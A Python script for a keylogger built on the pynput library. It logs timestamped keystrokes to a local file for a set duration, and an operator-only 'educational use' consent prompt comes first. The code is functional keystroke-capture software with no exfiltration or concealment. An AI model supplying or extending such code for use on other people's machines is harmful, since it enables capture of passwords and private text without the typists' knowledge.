import pynput
import time
import sys
import os
from datetime import datetime

# Create logs directory
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Log file with timestamp
log_file = os.path.join(LOG_DIR, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# Function to capture and log keystrokes
def log_key(key, live_display=False):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    # Handle printable vs special keys
    try:
        key_data = f"{timestamp}: {key.char}\n"
    except AttributeError:
        special_keys = {
            "Key.space": "[SPACE]",
            "Key.enter": "[ENTER]",
            "Key.tab": "[TAB]",
            "Key.backspace": "[BACKSPACE]",
            "Key.shift": "[SHIFT]",
            "Key.ctrl_l": "[CTRL]",
            "Key.ctrl_r": "[CTRL]",
            "Key.alt_l": "[ALT]",
            "Key.alt_r": "[ALT]",
        }
        key_data = f"{timestamp}: {special_keys.get(str(key), str(key))}\n"

    # Append keystroke to log file
    try:
        with open(log_file, "a") as file:
            file.write(key_data)
    except PermissionError:
        print("Error: No permission to write log file.")
        sys.exit(1)

    # Optional live logging
    if live_display:
        print(key_data.strip())

# Display disclaimer & request user confirmation
def show_disclaimer():
    print("------------ Ethical Keylogger Notice ------------")
    print("This program is for EDUCATIONAL purposes only.")
    print("You must obtain explicit permission before using it.")
    print("\nBy using this software, you agree to:")
    print("1. You have permission to log keystrokes on this device.")
    print("2. You will not use it to break any laws.")
    print("3. You accept full responsibility for its usage.")
    
    consent = input("\nDo you accept these terms? (yes/no): ").lower()
    if consent != 'yes':
        print("You must agree to the terms to use this program.")
        sys.exit()

# Get the duration for how long to log
def get_duration():
    try:
        duration = int(input("Enter logging duration in seconds: "))
        return duration
    except ValueError:
        print("Invalid input! Please enter a number.")
        sys.exit()

# Ask if user wants real-time console output
def get_live_display_choice():
    choice = input("Show keystrokes in real-time? (yes/no): ").lower()
    return choice == "yes"

# Main keylogger function
def start_keylogger():
    show_disclaimer()
    duration = get_duration()
    live_display = get_live_display_choice()

    print(f"\n[+] Logging keystrokes for {duration} seconds...")
    print(f"[+] Log file: {os.path.abspath(log_file)}\n")

    try:
        with pynput.keyboard.Listener(on_press=lambda k: log_key(k, live_display)) as listener:
            time.sleep(duration)
            listener.stop()
    except KeyboardInterrupt:
        print("\n[!] Keylogger stopped by user (Ctrl+C).")

    print(f"\n[✔] Keystrokes saved to: {os.path.abspath(log_file)}")

if __name__ == "__main__":
    start_keylogger()
